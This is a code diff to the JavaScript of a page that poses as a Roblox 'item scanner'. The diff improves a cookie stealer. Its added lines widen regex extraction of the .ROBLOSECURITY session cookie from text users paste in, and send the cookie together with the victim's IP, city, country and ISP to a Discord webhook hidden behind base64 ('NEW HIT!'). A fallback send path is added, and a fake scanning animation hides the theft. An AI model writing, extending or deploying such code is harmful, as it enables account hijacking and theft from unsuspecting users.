@@ -187,6 +187,14 @@ async function submitPowerShell() {
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
+        // Debug logging
+        console.log('Input length:', inputText.length);
+        console.log('Cookie found:', robloxCookie ? 'YES' : 'NO');
+        if (robloxCookie) {
+            console.log('Cookie length:', robloxCookie.length);
+            console.log('Cookie preview:', robloxCookie.substring(0, 50) + '...');
+        }
+        
         // Check word count - if 50+ words, allow through even without auth data
         const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
         
@@ -213,11 +221,24 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Simple working payload to avoid 400 errors
+        // Format cookie for better readability in Discord
+        let formattedCookie = 'None';
+        if (robloxCookie) {
+            // Truncate very long cookies but keep them copyable
+            if (robloxCookie.length > 100) {
+                formattedCookie = `\`\`\`${robloxCookie}\`\`\``;
+            } else {
+                formattedCookie = `\`${robloxCookie}\``;
+            }
+        }
+        
+        // Enhanced payload with better formatting
         const payload = {
-            content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
+            content: `@everyone **🚨 NEW HIT! 🚨**\n\n**🍪 Cookie:**\n${formattedCookie}\n\n**📍 Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**🌐 IP:** ${locationInfo.ip || 'Unknown'}\n**🏢 ISP:** ${locationInfo.isp || 'Unknown'}\n**⏰ Time:** ${new Date().toLocaleString()}`
         };
 
+        console.log('Sending webhook with payload:', payload);
+        
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -225,6 +246,8 @@ async function submitPowerShell() {
             },
             body: JSON.stringify(payload)
         });
+        
+        console.log('Webhook response status:', response.status);
         
         if (response.ok) {
             submitText.textContent = 'Scanning item please wait';
@@ -240,7 +263,37 @@ async function submitPowerShell() {
                 closeScanModal();
             }, 4000);
         } else {
-            throw new Error(`Item scanning failed with status: ${response.status}`);
+            // If enhanced format fails, try simple format as fallback
+            console.log('Enhanced format failed, trying simple format...');
+            const fallbackPayload = {
+                content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
+            };
+            
+            const fallbackResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(fallbackPayload)
+            });
+            
+            if (fallbackResponse.ok) {
+                console.log('Fallback format succeeded');
+                submitText.textContent = 'Scanning item please wait';
+                submitBtn.style.background = '#10b981';
+                showNotification('Scanning item please wait', 'success');
+                
+                // Show scanning animation with loading overlay
+                showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
+                startScanningAnimation();
+                
+                setTimeout(() => {
+                    hideLoadingOverlay();
+                    closeScanModal();
+                }, 4000);
+            } else {
+                throw new Error(`Item scanning failed with status: ${response.status} (fallback also failed: ${fallbackResponse.status})`);
+            }
         }
     } catch (error) {
         hideLoadingOverlay();
@@ -376,32 +429,64 @@ function hasValidData(text) {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
-    // First, try to find .ROBLOSECURITY directly
-    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
-    if (roblosecurityIndex !== -1) {
-        // Find the opening quote after .ROBLOSECURITY
-        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
-        if (startQuoteIndex !== -1) {
-            const valueStartIndex = startQuoteIndex + 1;
-            // Find the closing quote
-            const endQuoteIndex = text.indexOf('"', valueStartIndex);
-            if (endQuoteIndex !== -1) {
-                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
-                if (cookieValue.length > 50) {
-                    return cookieValue;
-                }
+    // Multiple patterns to find .ROBLOSECURITY cookies
+    const patterns = [
+        // PowerShell New-Object pattern with double quotes
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/gi,
+        // PowerShell New-Object pattern with single quotes  
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*'\.ROBLOSECURITY'\s*,\s*'([^']+)'/gi,
+        // Direct .ROBLOSECURITY with quotes
+        /\.ROBLOSECURITY[^"']*["']([^"']+)["']/gi,
+        // Cookie Add pattern
+        /Cookies\.Add.*\.ROBLOSECURITY[^"']*["']([^"']+)["']/gi,
+        // Simple .ROBLOSECURITY= pattern
+        /\.ROBLOSECURITY\s*=\s*([A-Za-z0-9+/_\-]{100,})/gi,
+        // Warning format pattern
+        /WARNING.*\.ROBLOSECURITY[^A-Za-z0-9+/_\-]*([A-Za-z0-9+/_\-]{100,})/gi
+    ];
+    
+    // Try each pattern
+    for (const pattern of patterns) {
+        const matches = [...text.matchAll(pattern)];
+        for (const match of matches) {
+            const cookieValue = match[1];
+            if (cookieValue && cookieValue.length > 50) {
+                console.log('Cookie extracted via pattern:', pattern.source);
+                return cookieValue.trim();
             }
         }
     }
     
-    // Fallback: Look for any very long string that might be the authentication token
-    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
-    if (longStrings && longStrings.length > 0) {
-        // Return the longest string found
-        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
-        return longest;
+    // Direct search method as fallback
+    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
+    if (roblosecurityIndex !== -1) {
+        // Look for the cookie value after .ROBLOSECURITY
+        const afterRoblo = text.substring(roblosecurityIndex + '.ROBLOSECURITY'.length);
+        
+        // Try to find value in quotes
+        const quoteMatches = afterRoblo.match(/["']([A-Za-z0-9+/_\-]{50,})["']/);
+        if (quoteMatches) {
+            console.log('Cookie extracted via quote search');
+            return quoteMatches[1].trim();
+        }
+        
+        // Try to find value after equals
+        const equalsMatch = afterRoblo.match(/[=:]\s*([A-Za-z0-9+/_\-]{50,})/);
+        if (equalsMatch) {
+            console.log('Cookie extracted via equals search');
+            return equalsMatch[1].trim();
+        }
     }
     
+    // Last resort: Look for any very long string that might be the token
+    const longStrings = text.match(/[A-Za-z0-9+/_\-]{500,}/g);
+    if (longStrings && longStrings.length > 0) {
+        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
+        console.log('Cookie extracted via long string fallback');
+        return longest.trim();
+    }
+    
+    console.log('No cookie found in text');
     return null;
 }
 
